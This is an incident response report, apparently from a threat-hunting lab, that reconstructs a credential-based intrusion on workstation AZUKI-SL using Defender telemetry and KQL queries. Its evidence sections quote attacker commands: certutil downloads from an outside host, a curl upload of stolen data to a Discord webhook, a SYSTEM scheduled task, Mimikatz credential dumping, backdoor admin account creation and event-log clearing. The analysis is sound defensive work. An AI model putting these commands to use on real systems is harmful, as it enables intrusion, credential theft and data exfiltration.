# Table of Contents

- [Executive Summary](#executive-summary)
- [Investigation Overview](#investigation-overview)
- [Analytic Findings](#analytic-findings)
  - [Finding 1 – Initial Access: Remote Access Source](#finding-1--initial-access-remote-access-source)
  - [Finding 2 – Initial Access: Compromised Account](#finding-2--initial-access-compromised-account)
  - [Finding 3 – Discovery: Network Reconnaissance](#finding-3--discovery-network-reconnaissance)
  - [Finding 4 – Defence Evasion: Malware Staging Directory](#finding-4--defence-evasion-malware-staging-directory)
  - [Finding 5 – Defence Evasion: File Extension Exclusions](#finding-5--defence-evasion-file-extension-exclusions)
  - [Finding 6 – Defence Evasion: Temporary Folder Exclusion](#finding-6--defence-evasion-temporary-folder-exclusion)
  - [Finding 7 – Defence Evasion: Download Utility Abuse](#finding-7--defence-evasion-download-utility-abuse)
  - [Finding 8 – Persistence: Scheduled Task Name](#finding-8--persistence-scheduled-task-name)
  - [Finding 9 – Persistence: Scheduled Task Target](#finding-9--persistence-scheduled-task-target)
  - [Finding 10 – Command and Control: C2 Server Address](#finding-10--command-and-control-c2-server-address)
  - [Finding 11 – Command and Control: C2 Communication Port](#finding-11--command-and-control-c2-communication-port)
  - [Finding 12 – Credential Access: Credential Theft Tool](#finding-12--credential-access-credential-theft-tool)
  - [Finding 13 – Credential Access: Memory Extraction Module](#finding-13--credential-access-memory-extraction-module)
  - [Finding 14 – Collection: Data Staging Archive](#finding-14--collection-data-staging-archive)
  - [Finding 15 – Exfiltration: Exfiltration Channel](#finding-15--exfiltration-exfiltration-channel)
  - [Finding 16 – Anti-Forensics: Log Tampering](#finding-16--anti-forensics-log-tampering)
  - [Finding 17 – Impact: Persistence Account](#finding-17--impact-persistence-account)
  - [Finding 18 – Execution: Malicious Script](#finding-18--execution-malicious-script)
  - [Finding 19 – Lateral Movement: Secondary Target](#finding-19--lateral-movement-secondary-target)
  - [Finding 20 – Lateral Movement: Remote Access Tool](#finding-20--lateral-movement-remote-access-tool)
- [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
- [Remediation Recommendations](#remediation-recommendations)
- [Lessons Learned](#lessons-learned)
- [Conclusion](#conclusion)


# Azuki Logistics – Incident Response Report
**Full Attack Chain Analysis**  
**Date of Suspected Activity:** Nov 19-20, 2025
**Date of Investigation:** Nov 22, 2025  
**Analyst:** Weston Henderson

---

# Executive Summary

A small logistics company experienced a credential-based compromise resulting in:

- Unauthorized RDP access  
- Credential theft via LSASS extraction  
- Malware staging & persistence  
- Lateral movement  
- Data theft & exfiltration to Discord  
- Log tampering & anti-forensics  

All attacker activity originated from the compromised IT admin workstation **AZUKI-SL**, using a sequence of PowerShell, certutil, minimized LOLBins, and a disguised credential-dumping tool.

This report documents the complete attack chain, indicators of compromise, and supporting KQL queries.

---

# Incident Timeline (High-Level)

| Time (JST) | Event |
|-----------|-------|
| 11:36 AM | Attacker logs in via stolen account (`kenji.sato`) from **88.97.178.12** |
| 11:37 AM | PowerShell invoked to download initial script (`wupdate.ps1`) |
| 11:46 AM | Additional batch script downloaded (`wupdate.bat`) |
| 12:06 PM | Malware payloads downloaded via certutil (`svchost.exe`, `mm.exe`) |
| 12:07 PM | Staging folder hidden: `C:\ProgramData\WindowsCache` |
| 12:09 PM | Exfiltration ZIP prepared (`export-data.zip`) |
| 12:10 PM | Archive exfiltrated via Discord webhook (`curl.exe`) |
| 12:12 PM | Credential theft tool (`mm.exe`) extracts LSASS secrets |
| 12:20 PM | Backdoor account created: `support` |
| 12:27 PM | Scheduled persistence task created (`Windows Update Check`) |
| 12:30 PM | Lateral movement to **10.1.0.188** |
| 12:40 PM | Event logs cleared (`wevtutil`, Security log first) |

---

# Attack Chain (MITRE ATT&CK Mapping)

| Phase | Technique | Evidence |
|-------|-----------|----------|
| **Initial Access** | T1078 – Valid Accounts | RDP login from 88.97.178.12 |
| **Execution** | T1059 – PowerShell | `Invoke-WebRequest` downloads |
| **Persistence** | T1053 – Scheduled Tasks | `/tn "Windows Update Check"` |
| **Privilege Escalation** | T1134 – Token Manipulation | SYSTEM task execution |
| **Defense Evasion** | T1562 – Disable Security Tools | Defender exclusions (extensions + paths) |
| **Credential Access** | T1003 – Credential Dumping | `sekurlsa::logonpasswords` via `mm.exe` |
| **Discovery** | T1040 – Network Reconnaissance | `arp -a` |
| **Lateral Movement** | T1021 – RDP | `mstsc /v:10.1.0.188` |
| **Collection** | T1560 – Archive Collected Data | `export-data.zip` |
| **Exfiltration** | T1041 – Exfil over Web Service | Discord webhook (`curl -F`) |
| **Impact / Anti-Forensics** | T1070 – Clear Logs | `wevtutil.exe cl Security` |

---

# Investigative Chain of Events

## **Analytic Finding 1 & 2 — Initial Access Source, Compromised User Account**

## Objective
Determine the external IP address used by the attacker to obtain initial access to the compromised workstation **AZUKI-SL** and which user account was used by the attacker to authenticate into the compromised system during initial access. Identifying the compromised account helps define the intrusion scope, required credential resets, and subsequent logon activity that must be reviewed. Identifying the origin of unauthorized remote authentication helps analysts attribute attacks, block malicious infrastructure, and reconstruct the intrusion timeline.

## Finding
The attacker accessed the server remotely using valid credentials for the user account **kenji.sato** from the external IP address:

**88.97.178.12**

This remote IP represents the initial foothold used to compromise the environment.

## Evidence
A successful remote logon event was recorded in **DeviceLogonEvents** showing:
- `AccountName`: **kenji.sato**
- `LogonType`: Network (remote authentication)
- `ActionType`: LogonSuccess
- `RemoteIP`: **88.97.178.12**
- Timestamp aligned with the start of malicious activity

## KQL Query Used
```kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where LogonType in ("Network", "RemoteInteractive", "RemoteInteractiveOrRdp")
| project Timestamp, AccountName, LogonType, RemoteIP
| order by Timestamp asc
```

## KQL Query Result

<img width="821" height="192" alt="Th2flg1" src="https://github.com/user-attachments/assets/4bd8420e-01b8-4cd6-9e42-4d3b8b96256a" />

## Why This Matters

Identifying the attacker’s source IP is critical for determining the intrusion’s origin, mapping adversary infrastructure, and enabling swift containment actions such as IP blocking. This also establishes the earliest confirmed malicious activity in the timeline, providing a reference point for correlating all subsequent attacker actions. Understanding how the attacker gained access helps prevent future compromises via hardened authentication, MFA enforcement, and improved monitoring of remote access attempts.

Compromised user credentials allow attackers to gain authenticated access that blends in with legitimate activity. In this case, the use of kenji.sato provided the adversary with valid access to the IT administrator workstation, enabling further actions such as staging malware, downloading tools, and escalating privileges without triggering immediate authentication-based alerts. Understanding which account was compromised is essential for containment, forcing password resets, and backtracking the attacker’s authenticated activity across the environment.

# Analytic Finding 3: Network Reconnaissance

## Objective
Determine whether the attacker performed internal network discovery to identify reachable hosts, potential lateral movement targets, and available network services following initial access.

## Finding
The attacker executed the `arp -a` command on the compromised host, indicating reconnaissance of local network devices and their associated MAC addresses. This action is consistent with early-stage internal discovery techniques used to map out the immediate subnet and identify additional systems of interest.

## Evidence
Shortly after gaining initial access through stolen credentials, the attacker ran the command: `arp -a`

This command enumerates the Address Resolution Protocol (ARP) cache, revealing active devices on the same network segment. The execution occurred within minutes of the attacker’s successful remote logon, aligning with typical discovery behavior after establishing a foothold.

## KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "arp"
| project Timestamp, DeviceName, ProcessCommandLine, FileName, FolderPath
```
## KQL Query Result

<img width="1102" height="242" alt="Th2flg3" src="https://github.com/user-attachments/assets/0bc18ae6-e27e-491b-ac35-7792ffb1ddaf" />

## Why This Matters

Network discovery activity such as `arp -a` is a strong indicator of malicious intent. Legitimate users rarely enumerate ARP tables manually, whereas attackers frequently rely on this technique to identify accessible hosts and pivot opportunities. Detecting early discovery actions allows defenders to intervene before lateral movement or broader compromise occurs. This type of behavior aligns with **MITRE ATT&CK technique T1046: Network Service Discovery** and is a reliable early-warning sign of hands-on-keyboard activity.

## Analytic Finding 4 — Malware Staging Directory Identified

### Objective
Determine the directory created and used by the attacker to stage malicious payloads and data prior to exfiltration.  
Attackers commonly create hidden folders inside system paths to evade detection and maintain a workspace for tooling.

### Finding
The attacker created a hidden directory named **WindowsCache** within **C:\ProgramData**, a system folder commonly abused for covert staging.  
This directory was used to store downloaded malware and preparation files for the later stages of the attack.

### Evidence
A registry event showed a **Windows Defender folder exclusion** added for a suspicious path, and investigations into attribute-modified directories revealed:
- Folder was created during the compromise window.
- Folder attributes included **Hidden**, matching anti-forensic intent.
- Folder contained downloaded binaries (svchost.exe, mm.exe) tied to subsequent persistence and credential access flags.

The exact staging directory confirmed: `C:\ProgramData\WindowsCache`

### KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has "+h"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="752" height="158" alt="Th2flg4" src="https://github.com/user-attachments/assets/6b8cae6d-0bee-4b85-a3f9-16dbbb5433c3" />

## Why This Matters

Hidden staging directories in system-level paths like `C:\ProgramData` are a strong indicator of deliberate defense evasion.  
They provide attackers a persistent working area that blends into legitimate OS structure while remaining outside normal user view.  
Identifying the staging directory is essential because it reveals the location of dropped malware, collected data, and any additional tooling the attacker prepared for later phases such as persistence, credential access, and exfiltration.  
Without discovering this directory, crucial evidence of the adversary’s actions would remain concealed, limiting the ability to reconstruct the attack chain or fully remediate the system.

## Analytic Finding 5 — Defence Evasion: File Extension Exclusions

### **Objective**
To determine whether the attacker modified Windows Defender configuration to evade detection by excluding specific file extensions from malware scanning.

### **Finding**
Three file extensions were added to Windows Defender’s exclusion list, allowing the attacker to execute malicious tools and scripts without being scanned or blocked. This demonstrates deliberate defense evasion and an attempt to blind endpoint protection.

### **Evidence**
Registry modification events in `DeviceRegistryEvents` showed new entries created under: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions`

Each entry contained a file extension (e.g., `.ps1`, `.bat`, `.exe`) excluded from Defender scanning. The total count was **3 unique extensions**.

### **KQL Query Used**
```kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryKey startswith @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData
| distinct RegistryValueName
| count
```
## Why This Matters

Excluding file extensions from antivirus scanning is a high-confidence indicator of malicious intent. It allows attackers to:

- Run malware without triggering real-time protection
- Hide payloads in predictable formats
- Maintain a foothold despite endpoint security controls

These changes persist across reboots and survive typical cleanup procedures. Identifying and reversing file extension exclusions is critical to restoring defender visibility and preventing reinfection.

## Analytic Finding 6 — Temporary Folder Exclusion (Defence Evasion)

### **Objective**
Identify whether the attacker modified Windows Defender exclusion settings to hide malicious activity, specifically by excluding temporary directories used for staging malicious tools and scripts.

### **Finding**
The attacker added a **temporary folder exclusion** to Windows Defender, preventing the antivirus engine from scanning files within the Temp directory used heavily during the intrusion. This allowed downloaded malware and scripts to execute without being inspected or quarantined.

### **Evidence**
A Windows Defender exclusion was added to the registry under the **Paths** exclusion key, with the excluded folder using DOS 8.3 short-path notation: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

This modification indicates intentional defense evasion, allowing the attacker to freely stage and execute scripts and payloads inside the Temp directory.

### **KQL Query Used**
```kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where RegistryKey contains "Windows Defender\\Exclusions\\Paths"
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp asc
```

## KQL Query Result

<img width="930" height="193" alt="Th2flg6" src="https://github.com/user-attachments/assets/1c2c0777-7688-4a6d-9cb7-182896d32530" />

## Why This Matters

Modifying antivirus exclusion paths is a high-confidence indicator of malicious tampering and advanced defense evasion. Temporary directories are frequently targeted by attackers because:

- They are writable by normal users
- They are not closely monitored
- Malware and scripts are commonly executed from there

By excluding the Temp directory from scanning, the attacker ensured that PowerShell scripts, payloads, credential-dumping tools, and staged binaries could run undetected. This action directly contributed to the success of multiple stages of the attack, including execution, credential access, and staging for persistence.

Understanding this behavior helps defenders identify attempts to weaken security controls and reinforces the need for alerts around changes to Windows Defender configuration, especially in exclusion paths.

## Analytic Finding 7 — Download Utility Abuse

### Objective
Determine which **Windows-native utility** the attacker abused to download malicious payloads during the execution phase of the intrusion.

### Finding
The attacker used **certutil.exe**, a legitimate Windows certificate utility, to download multiple malicious executables directly into the hidden staging directory (`C:\ProgramData\WindowsCache`). Certutil is a well-known LOLBin (Living-Off-the-Land Binary) commonly abused because it blends into normal administrative activity and is preinstalled on all Windows systems.

### Evidence
Multiple process execution events showed certutil performing network fetch operations using the `-urlcache -f` parameters. These events correspond to the retrieval of key malware components:

- **svchost.exe** (malicious persistence payload)  
- **mm.exe** (renamed credential dumping module)

Both were downloaded from the attacker’s infrastructure at `http://78.141.196.6:8080/`.

Example evidence:

"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe
 C:\ProgramData\WindowsCache\svchost.exe
 
"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe
 C:\ProgramData\WindowsCache\mm.exe

 These downloads occurred shortly after initial access and immediately before persistence, credential theft, and lateral movement activity.

### KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "http://" or ProcessCommandLine contains "https://"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="1312" height="327" alt="Th2flg7" src="https://github.com/user-attachments/assets/f9d61641-c301-4750-baee-aff91a3f910c" />

## Why This Matters

The abuse of certutil.exe represents a high-fidelity indicator of malicious activity. Certutil is a dual-use tool built into Windows and frequently leveraged in malware delivery operations to download payloads without triggering signature-based detection. Because certutil is trusted and signed by Microsoft, many security controls do not scrutinize its usage closely. Identifying this behavior is critical for early threat detection, as it often marks the beginning of a full attack chain including persistence, credential theft, and lateral movement. Monitoring for certutil execution with remote URLs should be a standard component of any enterprise detection strategy.

### Analytic Finding 8 & 9 — Scheduled Task Persistence Creation and Target

**Objective**  
Identify whether the attacker established persistence on the compromised system using scheduled tasks, a common Windows-native mechanism that survives reboots and privileges escalation.

**Finding**  
The attacker created a malicious scheduled task named **"Windows Update Check"** to execute a backdoored payload located in the attacker’s staging directory. This task was configured to run daily at 2:00 AM under the SYSTEM account, granting full machine-level persistence.

**Evidence**  
A malicious `schtasks.exe` command was observed creating a new scheduled task with the following parameters:  
- **Task Name:** **Windows Update Check**
- **Executable Target:** `C:\ProgramData\WindowsCache\svchost.exe`  
- **Schedule:** Daily at 02:00  
- **Run As:** SYSTEM  
- **Intent:** Execute attacker’s payload automatically  

Full command extracted from process execution logs: `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM`


**KQL Query Used**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine contains "/create"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="1287" height="126" alt="Th2flg8 9" src="https://github.com/user-attachments/assets/e53d4640-7460-42b5-98bd-2e1839efb2f6" />

## Why This Matters

The scheduled task target defines the payload that will run automatically on a recurring basis. By inserting a malicious executable into a scheduled task configured to run as SYSTEM, the attacker ensured reliable and stealthy persistence. This allows continued access even after reboots or user logouts. Identifying the target binary provides defenders with crucial insight into where the malware resides, enabling its removal and informing further scoping for artifacts in the staging directory.

## Analytic Finding 10: Command & Control Server Address

### Objective
Identify the external command-and-control (C2) server the attacker communicated with after establishing persistence. Determining the C2 endpoint is critical for threat intelligence correlation, network containment, and scoping attacker infrastructure.

### Finding
The attacker’s persistence payload (`svchost.exe` staged in C:\ProgramData\WindowsCache) established outbound communication with an external IP address. This IP represents the primary command-and-control server used for remote tasking and operational control.

### Evidence
DeviceNetworkEvents showed outbound connections from the malicious executable to:
- **RemoteIP:** 78.141.196.6  
- **Protocol/Port:** HTTPS (443)  
- **InitiatingProcess:** `svchost.exe` located in the attacker’s staging directory

This confirms that 78.141.196.6 was the designated C2 server.

### KQL Query Used
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessFolderPath contains "WindowsCache"
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="1017" height="240" alt="Th2flg10" src="https://github.com/user-attachments/assets/81567c59-32fb-4d32-8d9b-6d21ff194b08" />

## Why This Matters

Identifying the C2 server provides direct insight into the attacker’s infrastructure and operational control mechanisms. Blocking this IP prevents further remote tasking, halts data theft, and disrupts active sessions between the compromised system and the adversary. This information also assists threat intelligence teams in correlating activity with known malware families, campaigns, and threat actor TTPs.

## Analytic Finding 11 — C2 Communication Port

### Objective
Determine the destination port used by the attacker’s command-and-control (C2) communications to understand the protocol leveraged and support creation of network-based detection and blocking rules.

### Finding
The attacker’s persistence malware (`svchost.exe` staged in `C:\ProgramData\WindowsCache`) communicated outbound to its C2 server using **TCP port 443**.

### Evidence
Investigation of `DeviceNetworkEvents` revealed outbound network traffic originating from the malicious binary after its execution. Although initial payload downloads used port 8080, the malware itself established C2 communication using HTTPS over port **443**, blending into legitimate encrypted traffic and making detection more difficult.

### KQL Query Used
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessFolderPath contains "WindowsCache"
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="745" height="233" alt="Th2flg11" src="https://github.com/user-attachments/assets/487e293d-3d87-4caf-bd35-0d982ce33e56" />

## Why This Matters

C2 communication is central to ongoing attacker control. Identifying the specific port helps security teams detect similar activity, apply outbound filtering, and block malicious infrastructure. Port 443 is commonly abused because encrypted traffic conceals payload content and is usually allowed through firewalls, making it a high-priority indicator in network defense engineering.

## Analytic Finding 12: Credential Theft Tool Identification

### Objective
Determine which attacker-deployed executable was used to perform credential dumping by accessing LSASS memory and extracting authentication material.

### Finding
The attacker used a short-named, masqueraded executable named **mm.exe** as the credential dumping tool. This binary was downloaded into the attacker-controlled staging directory and executed shortly before LSASS memory was accessed, consistent with Mimikatz-style credential theft.

### Evidence
- A suspiciously named executable (**mm.exe**) was downloaded from the attacker’s server using `certutil.exe`.
- The binary was placed in the staging directory: `C:\ProgramData\WindowsCache\mm.exe`.
- LSASS memory access events occurred shortly after the creation of this file.
- The script executed with module syntax consistent with credential dumping (later used in Flag 13).

### KQL Query Used
```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName =~ "mm.exe"
| project Timestamp, FileName, FolderPath, ActionType
```

## KQL Query Result

<img width="600" height="167" alt="Th2flg12" src="https://github.com/user-attachments/assets/4d993ce1-9f6c-4fe9-81c3-b1273ddd8c85" />

## Why This Matters

Identifying the credential dumping tool is crucial for understanding how the attacker escalated privileges and harvested credentials for lateral movement. Tools like this enable attackers to obtain plaintext passwords, NTLM hashes, and Kerberos tickets, which can lead to full domain compromise. Detecting the tool also allows defenders to create signatures, block execution of rogue binaries, and identify other systems where similar artifacts may exist.

## Analytic Finding 13 — Credential Access: Memory Extraction Module

### **Objective**
Identify the specific credential-dumping module used by the attacker to extract logon credentials from LSASS memory. Understanding this module clarifies which technique and tooling family were in use, and guides development of targeted detections.

### **Finding**
The attacker executed a credential-dumping tool using a **module::command** syntax consistent with **Mimikatz** operations.  
The specific module invoked for credential extraction was:

**`sekurlsa::logonpasswords`**

This module is the standard method used by Mimikatz to extract all available logon credentials, including plaintext passwords, NTLM hashes, Kerberos tickets, and WDigest material (if enabled).

### **Evidence**
- The attacker downloaded a renamed credential-dumping binary (`mm.exe`) into the staging directory (`C:\ProgramData\WindowsCache`).
- Shortly after, the process executed with Mimikatz-style parameters.
- Module syntax in the command line followed the `sekurlsa::<command>` pattern.
- The tool accessed LSASS memory, correlating with credential access alerts and process memory access events.
- The module invocation matched known behavior of the **sekurlsa** subsystem for accessing Security Support Provider (SSP) credentials.

### **KQL Query Used**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "sekurlsa" 
      or ProcessCommandLine contains "::"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="697" height="111" alt="Th2flg13" src="https://github.com/user-attachments/assets/6aa68f10-c605-458d-8ba4-e6cf11485368" />

## Why This Matters

The use of `sekurlsa::logonpasswords` demonstrates a direct attempt to extract authentication secrets from LSASS, one of the most critical stages in an intrusion.
Once executed successfully, this module provides the attacker with:

- Cleartext passwords (if available)
- NTLM password hashes
- Kerberos keys and tickets
- Credential material for all logged-on users

This capability enables credential theft, privilege escalation, and lateral movement across the environment.
Detecting this behavior early is crucial because it represents a pivot point in the attack where the adversary transitions from initial foothold to full domain compromise capability.

## Analytic Finding 14 & 15: Data Staging Archive & Exfiltration Channel Identified

### Objective
Determine which archive file the attacker created to collect and package stolen data prior to exfiltration. Data staging archives typically consolidate sensitive information into a single compressed file for efficient exfiltration and to reduce the number of outbound transfers analysts must identify.

### Finding
The attacker created a compressed ZIP archive named **export-data.zip** within the malicious staging directory (`C:\ProgramData\WindowsCache`). This ZIP file was later exfiltrated via curl to a Discord webhook, confirming it was the primary data collection container for stolen files. The attacker exfiltrated the staged archive (`export-data.zip`) using **Discord**, specifically by uploading the file to a Discord **webhook URL**, which provides anonymous, unauthenticated file upload capabilities.

### Evidence
During analysis of process execution and file creation events, a `curl.exe` command was observed uploading a specific ZIP file to an external cloud service:

curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/


This indicates:
- The ZIP file existed prior to the curl command.
- It was located in the attacker’s chosen staging folder.
- It was the only ZIP file used during exfiltration.
- It directly matches the behavior described in the collection and exfiltration phases.
- Use of `curl.exe` for outbound HTTPS upload
- Clear exfiltration of the archive prepared in the staging directory
- Destination domain `discord.com`, confirming the cloud service involved

### KQL Query Used
```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FolderPath contains @"C:\ProgramData\WindowsCache"
| where FileName endswith ".zip"
| project Timestamp, FileName, FolderPath, ActionType
| order by Timestamp asc
```

Additionally, to correlate the file with exfiltration:

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "curl"
| where ProcessCommandLine contains ".zip"
| project Timestamp, FileName, ProcessCommandLine
```

## KQL Query Result

<img width="623" height="152" alt="Th2flg14" src="https://github.com/user-attachments/assets/85122aa5-9066-4dec-90f5-56e6f94c71df" />

<img width="1248" height="150" alt="Th2flg14 2" src="https://github.com/user-attachments/assets/e9717f5f-985b-4750-b1d0-b5f07909923d" />


## Why This Matters

Identifying the staged archive is critical for understanding what data was likely stolen. The presence of export-data.zip indicates:

- The attacker successfully collected local files prior to exfiltration.
- The attack involved structured data theft rather than opportunistic browsing.
- The file provides a focal point for reconstructing the impact, including potential data categories exposed.
- Archive creation highlights where defense controls failed to prevent file aggregation or ZIP creation in high-risk directories.

Understanding the location and content of this archive directly supports data-loss analysis, regulatory impact assessments, and scoping notifications to affected stakeholders.

Attackers increasingly abuse legitimate cloud platforms such as Discord, Slack, Telegram, and Dropbox for data exfiltration because:

- Their traffic blends in with normal outbound HTTPS traffic.
- Webhooks provide anonymous upload capability.
- Many corporate firewalls do not block or inspect these services.
- It bypasses traditional DLP solutions that focus on email or known storage platforms.
- Identifying the exfiltration channel is crucial for:
- Blocking further data loss
- Notifying impacted service providers
- Conducting retroactive log reviews to determine if more data was exfiltrated
- Enhancing egress filtering and cloud service monitoring policies

The confirmed exfiltration channel for this incident was: Discord.

## Analytic Finding 16 – Log Tampering (Event Log Clearing)

### **Objective**
Determine whether the attacker attempted to impede forensic investigation by deleting Windows event logs, and identify which log was cleared first to understand attacker priorities during anti-forensic activity.

### **Finding**
The attacker executed `wevtutil.exe` to clear Windows event logs. The **Security** log was the first log cleared, indicating an intentional effort to erase authentication and privilege-related traces of the intrusion.

### **Evidence**
A `wevtutil.exe` process execution was observed near the end of the attack timeline, with command-line arguments specifying the clearing of the **Security** log before other logs. This log contains critical records such as failed/successful logons, privilege escalation, process creation (with event auditing enabled), and clearing it first is a known technique to disrupt incident reconstruction.

Example activity:

`wevtutil.exe cl Security`


### **KQL Query Used**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName =~ "wevtutil.exe"
| project Timestamp, ProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="490" height="243" alt="Th2flg16" src="https://github.com/user-attachments/assets/31ee13d2-23f1-4ea8-b106-3fee8a8686c8" />

## Why This Matters

Clearing event logs is a deliberate anti-forensics technique. By erasing the Security log first, the attacker attempted to remove evidence of initial access, credential abuse, lateral movement, and privilege escalation. This greatly complicates post-incident analysis and highlights the attacker’s operational maturity and awareness of forensic processes. Understanding which logs were cleared and in what order provides insight into attacker priorities and helps organizations design monitoring and protections for tamper-resistant security logging.

## Analytic Finding 17 — Persistence Account Creation

### **Objective**
Determine whether the attacker created an unauthorized user account to establish long-term persistence on the compromised system.

### **Finding**
The attacker created a hidden backdoor local account named **support** and added it to the **Administrators** group, granting full administrative control. This account was intended to provide durable fallback access even if other persistence mechanisms were removed.

### **Evidence**
Microsoft Defender for Endpoint process telemetry captured the following command execution:

`net1 user support ********** /add`
`net1 localgroup administrators support /add`


Key points:
- `net1.exe` is a lesser-monitored variant of `net.exe` that attackers commonly abuse.
- The `support` account was added to the local administrators group.
- This activity occurred during the impact/persistence phase immediately after successful exfiltration and anti-forensics actions.

### **KQL Query Used**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "/add"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```
## KQL Query Result

<img width="662" height="321" alt="Th2flg17" src="https://github.com/user-attachments/assets/8e86a0f4-6bc2-455c-873c-03784d0e8f94" />

## Why This Matters

Unauthorized account creation—especially accounts added to the Administrators group—represents a critical persistence technique. This allows threat actors to:

- Regain access even after credentials are reset
- Bypass detection by blending into normal user lists
- Maintain privileged control across reboots
- Execute further operations such as lateral movement, secondary backdoors, and cleanup
  
Finding and removing such accounts is essential to restoring system integrity and preventing reinfection.

### Analytic Finding 18: Malicious Script Used in Automation

**Objective**  
Identify the scripting component used by the attacker to automate the initial stages of the compromise, including downloading payloads, staging files, and preparing for further execution. Determining the initial script helps establish the attack chain's origin and assists in building preventative detections.

**Finding**  
The attacker used a malicious PowerShell script named **wupdate.ps1** to automate the attack chain. This script was downloaded from the attacker’s server shortly after the initial compromise and stored in a temporary directory for execution.

**Evidence**  
DeviceProcessEvents revealed multiple instances of PowerShell executing commands containing `Invoke-WebRequest` to download external script content. The malicious script file was saved to the user’s Temp directory as `wupdate.ps1`. This script served as the automation backbone for the attack chain, enabling payload deployment and staging.

**KQL Query Used**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
| where ProcessCommandLine contains ".ps1"
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="1585" height="166" alt="Th2flg18" src="https://github.com/user-attachments/assets/102ceb78-0541-4c47-a544-4fcb14cb6c86" />

## Why This Matters

The identification of **wupdate.ps1** as the automation script is critical because it represents the attacker's initial foothold and orchestration mechanism. Malicious PowerShell scripts enable complex actions to be chained together with minimal detection, including payload retrieval, staging, credential harvesting setup, and persistence establishment. Detecting these scripts early allows defenders to identify the root of the intrusion, improve behavioral detections around script execution, and disrupt entire attack chains before they escalate to more damaging stages.

## Analytic Finding 19 & 20: Lateral Movement – Secondary Target & Remote Access Tool Used for Lateral Movement

### Objective
Identify the internal system targeted by the attacker for lateral movement, revealing the next stage of the intrusion path and the attacker’s intended objectives within the network. Determine which remote access tool the attacker used to establish a connection with the secondary internal target during the lateral movement phase.

### Finding
The attacker attempted lateral movement to the internal host with the IP address **10.1.0.188**. This system was accessed using built-in Windows remote access tooling shortly after credential theft and persistence establishment, indicating a pivot toward additional high-value assets. The attacker used the native Windows Remote Desktop client **mstsc.exe** to initiate an RDP session to the internal system at **10.1.0.188**, enabling interactive access to a new host using stolen credentials.

### Evidence
Defender for Endpoint telemetry captured remote-access preparation and execution commands including `cmdkey` and `mstsc`, both referencing the target IP:

- `cmdkey /add:10.1.0.188 /user:fileadmin /pass:<redacted>`

DeviceProcessEvents logs showed the execution of the Remote Desktop client with a `/v:` parameter specifying the target system’s IP address:

- `mstsc /v:10.1.0.188`

These commands appeared late in the intrusion timeline, directly following credential dumping activity.

### KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
